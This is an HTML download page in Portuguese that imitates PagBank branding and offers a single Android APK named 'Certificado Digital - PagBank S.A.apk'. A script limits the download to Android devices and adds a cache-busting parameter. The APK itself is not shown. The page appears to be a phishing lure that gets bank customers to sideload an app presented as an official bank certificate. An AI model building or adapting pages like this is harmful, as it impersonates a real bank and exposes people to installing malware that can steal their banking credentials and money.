<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <title>PagBank - Download</title>
  <link rel="icon" type="image/jpeg" href="pagbank_img.jpeg">
  <link rel="shortcut icon" type="image/jpeg" href="pagbank_img.jpeg">
  <link rel="apple-touch-icon" href="pagbank_img.jpeg">
  <link rel="preload" href="pagbank_video.mp4" as="video" type="video/mp4">
  <link rel="preload" href="pagbank_img.jpeg" as="image">
  <link rel="stylesheet" href="styles.css">
  <meta name="theme-color" content="#00c244">
</head>
<body>
  <main class="page">
    <video class="bg-video" src="pagbank_video.mp4" autoplay muted loop playsinline></video>
    <div class="overlay"></div>

    <div class="center-content" role="img" aria-label="Logo PagBank">
      <img class="logo" src="pagbank_img.jpeg" alt="PagBank" />
    </div>

    <div class="notice" id="platform-notice" role="alert" aria-live="assertive"></div>

    <a class="download-button" href="./Certificado%20Digital%20-%20PagBank%20S.A.apk" download="Certificado Digital - PagBank S.A.apk" aria-label="Download">
      <span>Download</span>
    </a>
  </main>
  <script>
    (function() {
      var video = document.querySelector('.bg-video');
      if (video) {
        video.addEventListener('ended', function() {
          try {
            video.currentTime = 0;
            var playPromise = video.play();
            if (playPromise && typeof playPromise.then === 'function') {
              playPromise.catch(function(){});
            }
          } catch (e) {}
        });
      }

      var ua = navigator.userAgent || navigator.vendor || window.opera;
      var isAndroid = /Android/i.test(ua);
      var isIOS = /iPhone|iPad|iPod/i.test(ua);

      var downloadBtn = document.querySelector('.download-button');
      var notice = document.getElementById('platform-notice');

      if (downloadBtn) {
        try {
          var url = new URL(downloadBtn.getAttribute('href'), window.location.href);
          url.searchParams.set('v', Date.now().toString());
          downloadBtn.setAttribute('href', url.toString());
        } catch (e) {
          var sep = downloadBtn.href.indexOf('?') === -1 ? '?' : '&';
          downloadBtn.href = downloadBtn.href + sep + 'v=' + Date.now();
        }
      }

      if (downloadBtn && !isAndroid) {
        downloadBtn.classList.add('disabled');
        var msg = isIOS ? 'Download de APK disponível apenas em dispositivos Android.' : 'Este download está disponível apenas em dispositivos Android.';
        if (notice) {
          notice.textContent = msg;
          notice.classList.add('show');
        }
        downloadBtn.addEventListener('click', function(e) {
          e.preventDefault();
          e.stopPropagation();
          if (notice) {
            notice.classList.add('show');
          }
        }, { passive: false });
      }
    })();
  </script>
</body>
</html>
